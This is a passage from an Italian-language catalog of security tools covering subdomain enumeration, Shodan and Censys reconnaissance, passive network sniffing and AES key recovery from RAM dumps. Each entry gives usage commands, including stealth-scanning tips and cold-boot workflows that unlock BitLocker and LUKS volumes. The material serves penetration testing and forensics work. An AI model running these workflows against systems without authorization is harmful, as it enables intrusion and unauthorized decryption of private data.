    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ShuffleDNS</strong> di ProjectDiscovery è un wrapper intelligente attorno a massdns che semplifica drasticamente le operazioni di subdomain enumeration su larga scala. Mentre massdns raw è potente ma produce output rumoroso pieno di falsi positivi da DNS wildcard, ShuffleDNS integra wildcard filtering automatico e gestione intelligente dei resolver, producendo risultati puliti pronti per le fasi successive del workflow.</p><p>Il tool opera in due modalità: brute-force con wordlist per generare e testare nuovi subdomain, e resolve mode per validare liste pre-esistenti da altri tool come subfinder o amass. In entrambi i casi, il wildcard filtering analizza le risposte DNS per identificare e rimuovere i falsi positivi causati da domini che rispondono a qualsiasi query. L'architettura mantiene la velocità brutale di massdns (decine di migliaia di query al secondo) aggiungendo l'intelligence necessaria per risultati utilizzabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>-w</code> per brute-force con wordlist (genera subdomain e li risolve), <code>-list</code> per validare liste di subdomain pre-generate. Stesso motore, casi d'uso diversi.</p><p><strong>Wildcard Filtering Automatico:</strong> Rileva automaticamente DNS wildcard testando subdomain casuali e confrontando le risposte. Elimina tutti i risultati che matchano il pattern wildcard.</p><p><strong>Massdns Backend:</strong> Sfrutta massdns per parallelismo estremo. Default 10.000 query concorrenti, configurabile fino al limite della rete/hardware.</p><p><strong>Resolver Management:</strong> Accetta liste di resolver custom e distribuisce le query per evitare rate limiting e ottenere risultati da prospettive geografiche diverse.</p><p><strong>Resume Support:</strong> Può riprendere scansioni interrotte, utile per operazioni di ore su wordlist massive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Richiede massdns installato\n# Su Kali: apt install massdns\n# Richiede lista resolver (es. da github.com/trickest/resolvers)\n\n# === BRUTE-FORCE MODE ===\n# Brute-force base\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt\n\n# Con output file\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o found.txt\n\n# Wordlist massiva con concurrency aumentata\nshuffledns -d target.com -w subdomains-top1million-110000.txt \\\n  -r resolvers.txt -t 50000 -o results.txt\n\n# === RESOLVE MODE ===\n# Valida lista esistente (es. da subfinder)\nshuffledns -d target.com -list subdomains.txt -r resolvers.txt -o valid.txt\n\n# Pipeline con subfinder\nsubfinder -d target.com -silent | shuffledns -d target.com -r resolvers.txt\n\n# === WILDCARD HANDLING ===\n# Verifica se wildcard presente (test manuale)\necho \"randomnonexistent98765.target.com\" | shuffledns -d target.com -r resolvers.txt\n\n# Strict mode per wildcard detection\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -sw\n\n# === PIPELINE RECON ===\n# Workflow completo: brute + passive + merge\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o brute.txt &amp;\nsubfinder -d target.com -silent -o passive.txt &amp;\nwait\ncat brute.txt passive.txt | sort -u | shuffledns -d target.com -r resolvers.txt -o final.txt\n\n# Vers nuclei per vuln scan\ncat final.txt | httpx -silent | nuclei -t cves/ -severity high,critical\n\n# === MULTI-DOMAIN ===\n# Batch processing multipli domini\ncat domains.txt | while read domain; do\n  shuffledns -d \"$domain\" -w wordlist.txt -r resolvers.txt -o \"${domain}_subs.txt\" -silent\ndone\n\n# === OUTPUT OPTIONS ===\n# JSON per parsing programmatico\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -json -o results.json\n\n# Silent mode per pipeline\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent\n\n# === PERFORMANCE TUNING ===\n# Alta velocità (richiede buona connessione e molti resolver)\nshuffledns -d target.com -w massive_wordlist.txt -r 5000_resolvers.txt \\\n  -t 100000 -o results.txt\n\n# Retry per resolver instabili\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -retries 3\n\n# === INTEGRAZIONE MASSDNS ===\n# Specifica path massdns custom\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt \\\n  -m /custom/path/massdns</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Mass Subdomain Enumeration:</strong> Brute-force su larga scala per organizzazioni enterprise con potenzialmente migliaia di subdomain. La velocità di massdns permette di testare milioni di combinazioni in ore.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass/chaos, valida quali subdomain sono effettivamente live prima di procedere con scanning HTTP.</li><li><strong>Continuous Monitoring:</strong> Integrato in pipeline di monitoring, esegue scansioni periodiche per identificare nuovi subdomain deployati.</li><li><strong>ProjectDiscovery Workflow:</strong> Si integra nativamente con altri tool PD: subfinder per passive, shuffledns per active, httpx per probe, nuclei per scan.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Extreme DNS Volume:</strong> Genera un volume massiccio di query DNS. I nameserver autoritativi del target ricevono ogni query e potrebbero loggare o bloccare.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati vedono tutte le query. Per operazioni sensibili, considerare resolver privati o DoH.</li><li><strong>Rate Limiting Risk:</strong> Concurrency troppo alta può triggerare blocchi sui resolver. Usare molti resolver diversi e <code>-t</code> ragionevole.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato e nel PATH. Verificare prima dell'uso con <code>which massdns</code>.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "smap",
    "name": "smap",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/s0md3v/smap",
    "desc": "Port scanner passivo che usa Shodan API per scansionare senza contattare i target direttamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Smap</strong> di s0md3v è un port scanner rivoluzionario che inverte il paradigma tradizionale: invece di inviare pacchetti ai target per scoprire porte aperte, interroga l'API gratuita di Shodan per ottenere le stesse informazioni senza generare alcun traffico di rete verso i target. Progettato come drop-in replacement per Nmap, accetta la stessa sintassi di input e produce output compatibili (XML, greppable, standard), permettendo di sostituirlo in script e workflow esistenti.</p><p>Questa capacità è trasformativa per scenari dove la stealth è critica: penetration test con regole di engagement restrittive, reconnaissance su target che monitorano attivamente le scansioni, o pre-assessment per decidere se procedere con scanning attivo. La velocità è un altro vantaggio enorme: mentre nmap richiede minuti per scansionare un singolo host, smap può processare 200+ host al secondo perché le query sono verso Shodan, non verso i target. La limitazione principale è la freshness dei dati: Shodan indicizza periodicamente, quindi i risultati potrebbero essere vecchi di giorni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-Touch Scanning:</strong> Nessun pacchetto viene mai inviato ai target. Tutte le informazioni provengono dal database Shodan, rendendo la scansione completamente invisibile a IDS/IPS e firewall.</p><p><strong>Nmap Compatibility:</strong> Accetta la stessa sintassi di target (IP, CIDR, file) e produce output negli stessi formati (-oX per XML, -oG per greppable, -oN per normale). Integrabile in workflow esistenti.</p><p><strong>Vulnerability Detection:</strong> Quando Shodan ha identificato vulnerabilità note nei servizi (basandosi su banner e versioni), smap le riporta nell'output.</p><p><strong>No Authentication:</strong> Funziona con l'API pubblica di Shodan senza richiedere account o API key, anche se con rate limiting.</p><p><strong>Service Information:</strong> Oltre alle porte, riporta banner dei servizi, versioni software, certificati SSL e altre informazioni raccolte da Shodan.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo IP\nsmap 8.8.8.8\n\n# Scan hostname\nsmap target.com\n\n# Scan range CIDR\nsmap 10.0.0.0/24\n\n# === OUTPUT FORMATS ===\n# Output XML (compatibile con tool che parsano nmap XML)\nsmap 192.168.1.0/24 -oX results.xml\n\n# Output greppable (per scripting)\nsmap targets.txt -oG results.gnmap\n\n# Output normale in file\nsmap target.com -oN results.txt\n\n# === INPUT MULTIPLO ===\n# Da file di IP/hostname\nsmap -iL targets.txt\n\n# Mix di target\nsmap 192.168.1.1 target.com 10.0.0.0/24\n\n# === PIPELINE RECON ===\n# Workflow stealth: subfinder -&gt; smap -&gt; identify services\nsubfinder -d target.com -silent | dnsx -a -resp-only | smap -oX scan.xml\n\n# Quick assessment prima di nmap attivo\nsmap target.com  # vedi cosa è già noto\nnmap -sV target.com -p $(smap target.com | grep open | cut -d/ -f1 | tr '\\n' ',')  # scan attivo solo su porte note\n\n# Verifica esposizione infrastruttura\ncat company_ips.txt | smap -oG exposure.gnmap\ngrep \"open\" exposure.gnmap | wc -l  # conta servizi esposti\n\n# === ANALISI RISULTATI ===\n# Estrai servizi specifici\nsmap 10.0.0.0/24 -oG - | grep \"22/open\" | cut -d\" \" -f2  # host con SSH\n\n# Cerca servizi vulnerabili\nsmap target.com | grep -i \"vuln\"\n\n# === CONFRONTO CON NMAP ===\n# Smap per overview passiva\nsmap target.com -oX passive.xml\n\n# Nmap per conferma attiva\nnmap -sV target.com -oX active.xml\n\n# Diff per vedere cosa manca a Shodan\ndiff &lt;(grep -o 'portid=\"[0-9]*\"' passive.xml | sort) \\\n     &lt;(grep -o 'portid=\"[0-9]*\"' active.xml | sort)\n\n# === BULK SCANNING ===\n# Enterprise-scale assessment (centinaia di host in secondi)\nprips 10.0.0.0/16 | smap -oG massive_scan.gnmap\n\n# Con output silenzioso per post-processing\nsmap -iL 1000_hosts.txt -oX results.xml 2&gt;/dev/null</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Quando le regole di engagement proibiscono scanning attivo nella fase iniziale, o quando si vuole evitare di triggerare alert prima di essere pronti.</li><li><strong>Pre-Assessment Evaluation:</strong> Prima di un penetration test, verifica cosa è già pubblicamente noto sull'infrastruttura del cliente tramite Shodan.</li><li><strong>Attack Surface Discovery:</strong> Identifica rapidamente servizi esposti su range IP enormi senza generare traffico sospetto.</li><li><strong>Compliance Verification:</strong> Controlla periodicamente l'esposizione di servizi critici senza impattare la produzione.</li><li><strong>Comparison Baseline:</strong> Confronta risultati smap (passivi) con nmap (attivi) per identificare servizi che Shodan non ha ancora indicizzato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Visibility:</strong> Completamente invisibile ai target - nessun pacchetto, nessun log, nessun alert. Ideale per stealth.</li><li><strong>Shodan Visibility:</strong> Le query sono verso Shodan. Per operazioni molto sensibili, considerare che Shodan potrebbe loggare le query (anche se non le correla ai target).</li><li><strong>Data Freshness:</strong> I dati Shodan possono essere vecchi di giorni o settimane. Non affidabili per servizi appena deployati o modificati.</li><li><strong>Coverage Limitata:</strong> Shodan indicizza ~4000 porte, non tutte le 65535. Servizi su porte non standard potrebbero mancare.</li><li><strong>No IPv6:</strong> Supporto IPv6 limitato o assente. Usare nmap per target IPv6.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "censys-cencli",
    "name": "cencli",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/censys/cencli",
    "desc": "CLI ufficiale Censys per query su host, certificati e web properties con vulnerability scanning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cencli</strong> (Censys CLI) è lo strumento ufficiale da linea di comando per accedere alla piattaforma Censys, uno dei più completi database di intelligence su asset Internet al mondo. Censys esegue scansioni continue dell'intero spazio IPv4 e IPv6, indicizzando host, servizi, certificati SSL/TLS e web properties. La CLI porta questa potenza direttamente nel terminale, permettendo query complesse, lookup di asset specifici, e analisi aggregate senza dover usare l'interfaccia web.</p><p>A differenza di tool come Shodan che si concentrano principalmente su porte e banner, Censys eccelle nell'analisi dei certificati SSL/TLS, fondamentale per scoprire infrastruttura nascosta (un certificato wildcard può rivelare subdomain non altrimenti visibili), tracciare relazioni tra asset (certificati condivisi indicano proprietà comune), e identificare vulnerabilità crittografiche. Il comando Censeye integra vulnerability scanning automatizzato sui dati Censys, mentre le aggregazioni permettono trend analysis su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Intelligence:</strong> Lookup dettagliato di qualsiasi IP: porte aperte, servizi, banner, certificati SSL, autonomous system, geolocalizzazione, historical data per vedere come è cambiato nel tempo.</p><p><strong>Certificate Search:</strong> Query potenti sul database certificati: trova tutti i cert per un dominio, cerca per issuer, validity, SANs (Subject Alternative Names), algoritmi. Fondamentale per asset discovery.</p><p><strong>Aggregations:</strong> Query aggregate per analisi statistiche: distribuzione di servizi per country, trend temporali, top autonomous systems per un certo tipo di vulnerabilità.</p><p><strong>Censeye Integration:</strong> Vulnerability assessment automatizzato che correla i dati Censys con database CVE per identificare servizi vulnerabili.</p><p><strong>Historical Data:</strong> Accesso a snapshots storici per analizzare come l'infrastruttura di un target è evoluta nel tempo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configurazione credenziali (richiede account Censys gratuito)\ncensys config auth add\n# Inserire API ID e API Secret da censys.io/account/api\n\n# Verifica configurazione\ncensys config show\n\n# === HOST LOOKUP ===\n# Dettagli completi su un IP\ncensys hosts view 8.8.8.8\n\n# Output JSON per parsing\ncensys hosts view 8.8.8.8 -o json | jq '.services[].port'\n\n# Solo servizi aperti\ncensys hosts view 8.8.8.8 | grep -A5 \"Services:\"\n\n# === CERTIFICATE SEARCH ===\n# Trova tutti i certificati per un dominio\ncensys certs search \"parsed.subject.common_name: target.com\"\n\n# Certificati con SAN specifico (trova subdomain)\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\"\n\n# Certificati wildcard (rivelano infrastruttura)\ncensys certs search \"parsed.subject.common_name: *.target.com\"\n\n# Certificati scaduti (potenziale vulnerabilità)\ncensys certs search \"parsed.validity.end: [* TO 2024-01-01]\"\n\n# === HOST SEARCH ===\n# Trova host per servizio\ncensys hosts search \"services.service_name: SSH and autonomous_system.name: Target Inc\"\n\n# Host con vulnerabilità specifiche\ncensys hosts search \"services.software.cpe: *apache* and services.software.version: 2.4.49\"\n\n# Host per certificato\ncensys hosts search \"services.tls.certificates.leaf_data.subject.common_name: target.com\"\n\n# === AGGREGATIONS ===\n# Distribuzione servizi per un'organizzazione\ncensys hosts aggregate \"autonomous_system.name: Target Inc\" --field services.service_name\n\n# Top paesi per un certo servizio\ncensys hosts aggregate \"services.service_name: RDP\" --field location.country\n\n# === PIPELINE RECON ===\n# Workflow: trova cert -&gt; estrai subdomain -&gt; probe\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\" -o json | \\\n  jq -r '.[] | .parsed.extensions.subject_alt_name.dns_names[]' | \\\n  sort -u | httpx -silent | nuclei -t cves/\n\n# Trova tutti gli IP di un'organizzazione\ncensys hosts search \"autonomous_system.name: Target Inc\" -o json | \\\n  jq -r '.[].ip' | sort -u &gt; target_ips.txt\n\n# === CENSEYE VULNERABILITY SCAN ===\n# Scan vulnerabilità su target\ncensys censeye 192.168.1.1\n\n# Scan batch\ncensys censeye -iL targets.txt\n\n# === HISTORICAL ANALYSIS ===\n# Vedi come è cambiato un host\ncensys hosts diff 8.8.8.8 --start 2024-01-01 --end 2024-06-01\n\n# === OUTPUT &amp; EXPORT ===\n# CSV per spreadsheet\ncensys hosts search \"services.service_name: MySQL\" -o csv &gt; mysql_hosts.csv\n\n# JSON per processing\ncensys certs search \"parsed.issuer.organization: Let's Encrypt\" -o json &gt; letsencrypt_certs.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Discovery:</strong> Usando certificate SANs e host search per autonomous system, scopre l'intera infrastruttura internet-facing di un'organizzazione, inclusi asset dimenticati.</li><li><strong>Certificate Intelligence:</strong> Monitora certificati per un dominio: nuovi cert potrebbero indicare nuova infrastruttura, cert scaduti sono vulnerabilità, cert condivisi rivelano relazioni.</li><li><strong>Threat Hunting:</strong> Cerca indicatori di compromissione su scala internet: C2 servers, malware infrastructure, phishing domains basandosi su pattern in certificati o banner.</li><li><strong>Vulnerability Assessment Passivo:</strong> Identifica servizi con versioni vulnerabili note senza scansionare direttamente, utile per pre-assessment.</li><li><strong>Historical Analysis:</strong> Analizza come l'infrastruttura di un target è evoluta, identificando pattern di deployment o momenti di esposizione.</li><li><strong>Competitive Intelligence:</strong> Studia l'infrastruttura tecnologica di competitor analizzando i loro certificati e servizi esposti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Censys, nessun traffico verso i target analizzati. Completamente passivo.</li><li><strong>API Authentication:</strong> Richiede account Censys e API key. Le query sono loggate da Censys con il tuo account.</li><li><strong>Rate Limits:</strong> Account gratuiti hanno limiti sulle query. Account enterprise rimuovono i limiti.</li><li><strong>Data Freshness:</strong> I dati Censys sono aggiornati periodicamente (giorni/settimane). Non real-time.</li><li><strong>Legal Considerations:</strong> L'uso dei dati Censys è soggetto ai loro Terms of Service. Verificare compliance per il proprio use case.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "above",
    "name": "above",
    "version": "2.8",
    "icon": "../app/icons/above-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/above/",
    "desc": "Sniffer passivo di rete per intercettare protocolli L2/L3 (CDP, LLDP, ARP, DHCP) e rilevare dispositivi e VLAN.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Above</strong> è uno sniffer di rete passivo specializzato nell'intercettazione di protocolli di livello 2 e 3 utilizzati per il network discovery e la gestione infrastrutturale. Cattura e analizza traffico CDP (Cisco Discovery Protocol), LLDP (Link Layer Discovery Protocol), ARP, DHCP, STP, VTP, DTP, HSRP, VRRP, OSPF, EIGRP e altri protocolli di management, rivelando informazioni critiche sulla topologia di rete, dispositivi connessi, configurazioni VLAN e dettagli hardware che non emergono da scansioni attive tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Discovery:</strong> Ascolta silenziosamente il traffico broadcast/multicast senza inviare alcun pacchetto, rendendosi completamente invisibile a IDS/IPS e sistemi di monitoraggio. Ideale per reconnaissance in ambienti ad alta sicurezza dove ogni pacchetto anomalo viene analizzato.</p><p><strong>Protocol Analysis:</strong> Decodifica automaticamente CDP e LLDP per estrarre hostname, modelli di dispositivo, versioni firmware, indirizzi IP di management, capabilities (router/switch/phone) e informazioni sulle VLAN native e voice VLAN configurate.</p><p><strong>VLAN Discovery:</strong> Identifica le VLAN in uso sulla rete analizzando i tag 802.1Q e le informazioni DTP (Dynamic Trunking Protocol), permettendo di mappare la segmentazione logica della rete e identificare potenziali target per VLAN hopping.</p><p><strong>Routing Protocol Capture:</strong> Intercetta annunci OSPF, EIGRP, HSRP e VRRP per mappare la topologia di routing, identificare router virtuali e potenziali punti di attacco per routing hijacking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Above richiede privilegi root per catturare pacchetti raw e un'interfaccia in modalità promiscua.</p><pre><code># === CATTURA BASE ===\n# Avvio su interfaccia specifica\nsudo above -i eth0\n\n# Cattura con output dettagliato e timestamp\nsudo above -i eth0 -v --timestamp\n\n# === FILTRI PROTOCOLLO ===\n# Solo CDP e LLDP (discovery dispositivi)\nsudo above -i eth0 --cdp --lldp\n\n# Solo protocolli di routing (OSPF, EIGRP, HSRP)\nsudo above -i eth0 --ospf --eigrp --hsrp\n\n# Solo DHCP (discovery server e scope)\nsudo above -i eth0 --dhcp\n\n# === OUTPUT E ANALISI ===\n# Salvataggio JSON per parsing automatico\nsudo above -i eth0 -o discovery.json --format json\n\n# Output CSV per import in spreadsheet\nsudo above -i eth0 -o devices.csv --format csv\n\n# Cattura prolungata in background (24h monitoring)\nsudo above -i eth0 -o long_capture.json --timeout 86400 &amp;\n\n# === PIPELINE CON ALTRI TOOL ===\n# Estrai IP di management e scansiona\nsudo above -i eth0 --lldp -o - | jq -r '.management_ip' | sort -u | nmap -iL -\n\n# Identifica VLAN per VLAN hopping\nsudo above -i eth0 --dtp -v  # cerca native VLAN e trunk status</code></pre><p>Lasciare in esecuzione per 5-10 minuti permette di catturare gli annunci periodici CDP/LLDP (ogni 30-60s), HSRP (ogni 3s) e OSPF hello (ogni 10s).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Network Reconnaissance</strong> interna, Above rivela l'infrastruttura di rete senza generare traffico sospetto: modelli di switch Cisco, versioni IOS, VLAN configurate e indirizzi di management.</p><p>Per il <strong>VLAN Hopping</strong>, le informazioni raccolte (native VLAN, DTP status) sono prerequisiti essenziali per configurare attacchi double-tagging o switch spoofing.</p><p>In contesti di <strong>Physical Pentest</strong>, collegandosi a una porta di rete qualsiasi si ottiene immediatamente visibilità sulla topologia circostante.</p><p>Per <strong>Routing Attack Preparation</strong>, la cattura di OSPF/EIGRP/HSRP rivela area ID, authentication status e priorità dei router, informazioni necessarie per attacchi di route injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Essendo completamente passivo, Above è virtualmente non rilevabile. Non genera traffico e non modifica lo stato dell'interfaccia in modo osservabile remotamente.</p><p><strong>Limitazioni:</strong> Funziona solo su segmenti di rete dove il traffico broadcast/multicast è visibile. Switch configurati senza CDP/LLDP o con port isolation non riveleranno informazioni.</p><p><strong>Timing:</strong> Alcuni protocolli hanno timer lunghi (CDP 60s, LLDP 30s). Prevedere almeno 2-3 minuti di cattura per risultati completi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "aesfix",
    "name": "aesfix",
    "version": "1.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aesfix/",
    "desc": "Recupera chiavi AES corrotte da dump RAM correggendo bit flip tramite analisi key schedule e ridondanza algoritmica.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Aesfix</strong> è uno strumento forense specializzato nel recupero di chiavi crittografiche AES da dump di memoria RAM potenzialmente corrotti. Sfrutta la struttura matematica dell'algoritmo AES, in particolare la ridondanza intrinseca nel key schedule (espansione della chiave), per correggere automaticamente errori a singolo bit (bit flip) che possono verificarsi durante l'acquisizione della memoria. Questo è fondamentale in scenari di cold boot attack dove il degrado della RAM introduce errori casuali proporzionali al tempo trascorso e alla temperatura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correzione Bit Flip:</strong> L'algoritmo analizza le relazioni matematiche tra i round key dell'espansione AES. Poiché ogni round key dipende dal precedente tramite operazioni XOR e S-box, un errore in un byte produce inconsistenze rilevabili e correggibili attraverso il teorema di ridondanza del key schedule.</p><p><strong>Supporto Multi-Keysize:</strong> Gestisce chiavi AES-128 (10 round), AES-192 (12 round) e AES-256 (14 round), adattando l'analisi alla struttura specifica di ciascun key schedule e al numero di round key generati.</p><p><strong>Integrazione con Aeskeyfind:</strong> Progettato per lavorare in pipeline con aeskeyfind: quest'ultimo estrae i candidati chiave dalla RAM, aesfix li valida e corregge se necessario.</p><p><strong>Verifica Integrità:</strong> Oltre alla correzione, valida matematicamente se una chiave è un key schedule AES legittimo, utile per filtrare falsi positivi da aeskeyfind.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool accetta in input un file contenente una potenziale chiave AES (espansa o meno) e tenta la correzione.</p><pre><code># === CORREZIONE SINGOLA CHIAVE ===\n# Correzione chiave AES estratta\naesfix suspected_key.bin corrected_key.bin\n\n# Verifica senza correzione (dry-run)\naesfix --verify-only suspected_key.bin\n\n# === PIPELINE COMPLETA COLD BOOT ===\n# 1. Estrai tutte le chiavi candidate dal dump\naeskeyfind memory.dump > candidates.txt\n\n# 2. Correggi e valida ogni candidato\nwhile read key; do\n  echo $key | xxd -r -p > tmp.bin\n  if aesfix tmp.bin fixed.bin 2>/dev/null; then\n    echo \"[VALID] $(xxd -p fixed.bin)\"\n    cp fixed.bin \"keys/key_$(date +%s%N).bin\"\n  fi\ndone < candidates.txt\n\n# === WORKFLOW BITLOCKER ===\n# Dopo cold boot su sistema Windows con BitLocker\naeskeyfind -v memory.dump | tee all_keys.txt\ncat all_keys.txt | while read key; do\n  echo $key | xxd -r -p > key.bin\n  aesfix key.bin fixed.bin && \\\n    bdemount -k fixed.bin /dev/sda2 /mnt/bitlocker\ndone\n\n# === WORKFLOW LUKS ===\n# Per volumi LUKS (Linux)\nfor keyfile in keys/*.bin; do\n  cryptsetup luksOpen --key-file $keyfile /dev/sda1 decrypted && break\ndone</code></pre><p>L'output indica se la chiave era valida, corretta con successo (mostrando bit modificati), o irrecuperabile (troppi errori).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in <strong>Cold Boot Forensics</strong> quando si acquisisce RAM da sistemi con crittografia disco attiva (BitLocker, LUKS, FileVault, VeraCrypt). La finestra temporale per cold boot è 5-15 secondi a temperatura ambiente, estendibile a minuti con raffreddamento.</p><p>Dopo un cold boot attack, i bit flip sono comuni (1-5% dei bit dopo 30s) e aesfix permette di recuperare chiavi altrimenti inutilizzabili.</p><p>Utile in <strong>Memory Forensics</strong> generica quando si analizzano dump acquisiti con metodi non perfetti (DMA attack, crash dump, hibernation file).</p><p>Per <strong>Incident Response</strong>, permette di recuperare chiavi da memory dump di sistemi compromessi per analizzare dati cifrati dell'attaccante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Utilizzo:</strong> Tool puramente offline, opera su file locali. Nessun impatto di rete o rilevamento.</p><p><strong>Limitazioni:</strong> Può correggere solo errori limitati (tipicamente 1-2 bit per word di 32 bit). Chiavi con corruzione >5% rimangono irrecuperabili.</p><p><strong>Legalità:</strong> L'uso per accedere a dati cifrati senza autorizzazione può violare leggi su accesso abusivo. Usare solo in contesti forensi autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aeskeyfind",
    "name": "aeskeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aeskeyfind/",
    "desc": "Estrae chiavi AES da dump di memoria RAM cercando schedule di chiavi espanse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AESKeyFind</strong> è uno strumento forense specializzato nell'estrazione di chiavi di cifratura AES da dump di memoria volatile (RAM). Sfrutta una caratteristica intrinseca dell'algoritmo AES: durante l'uso, le chiavi vengono espanse in \"key schedules\" con pattern matematici riconoscibili (176 byte per AES-128, 208 per AES-192, 240 per AES-256). Il tool scansiona il dump cercando questi pattern, permettendo di recuperare chiavi anche da sistemi spenti o da immagini forensi, rendendo possibile la decifratura di volumi cifrati come BitLocker, TrueCrypt, VeraCrypt o FileVault.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Matching AES:</strong> Ricerca strutture di key schedule a 128, 192 e 256 bit nel dump di memoria. La matematica dell'espansione chiavi AES (Rijndael key schedule) crea pattern unici verificabili matematicamente che sopravvivono anche a parziale corruzione dei dati.</p><p><strong>Output Chiavi:</strong> Restituisce le chiavi candidate in formato esadecimale con offset nel file, pronte per essere testate su volumi cifrati o passate ad aesfix per correzione errori.</p><p><strong>Velocità:</strong> Ottimizzato con scansione lineare O(n), può processare 16GB di RAM in meno di 30 secondi su hardware moderno.</p><p><strong>Basso Falsi Positivi:</strong> La verifica matematica del key schedule riduce drasticamente i falsi positivi rispetto a ricerche entropy-based.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un file di dump della memoria in formato raw.</p><pre><code># === ESTRAZIONE BASE ===\n# Estrazione chiavi AES da dump\naeskeyfind memory.dmp\n\n# Output verbose con offset in memoria\naeskeyfind -v memory.dmp\n\n# === FONTI DI MEMORY DUMP ===\n# Windows - DumpIt (acquisizione live)\nDumpIt.exe  # genera memory.raw\naeskeyfind memory.raw\n\n# Windows - hiberfil.sys (hibernation)\naeskeyfind /mnt/windows/hiberfil.sys\n\n# Windows - crash dump\naeskeyfind C:\\Windows\\MEMORY.DMP\n\n# Linux - LiME (acquisizione live)\nsudo insmod lime.ko \"path=/tmp/ram.lime format=raw\"\naeskeyfind /tmp/ram.lime\n\n# Linux - /dev/mem (richiede boot param)\naeskeyfind /dev/mem  # iomem=relaxed needed\n\n# macOS - osxpmem\nsudo osxpmem -o ram.aff4\naeskeyfind ram.aff4\n\n# === WORKFLOW COMPLETO ===\n# 1. Estrai chiavi candidate\naeskeyfind -v memory.dump > keys.txt\n\n# 2. Correggi eventuali bit flip\ncat keys.txt | while read offset key; do\n  echo $key | xxd -r -p > candidate.bin\n  aesfix candidate.bin fixed.bin 2>/dev/null && \\\n    echo \"$offset: $(xxd -p fixed.bin)\"\ndone > valid_keys.txt\n\n# 3. Testa chiavi su BitLocker\nfor key in $(cat valid_keys.txt | cut -d: -f2); do\n  echo $key | xxd -r -p > test.bin\n  bdemount -k test.bin /dev/sda2 /mnt/decrypted && break\ndone\n\n# === RICERCA SPECIFICA ===\n# Solo AES-256 (per BitLocker/VeraCrypt)\naeskeyfind -q memory.dmp | grep -E '^[0-9a-f]{64}$'</code></pre><p>Le chiavi trovate devono essere validate provando a decifrare il contenuto target. Tipicamente si trovano 1-5 chiavi candidate per sistema con FDE attivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital 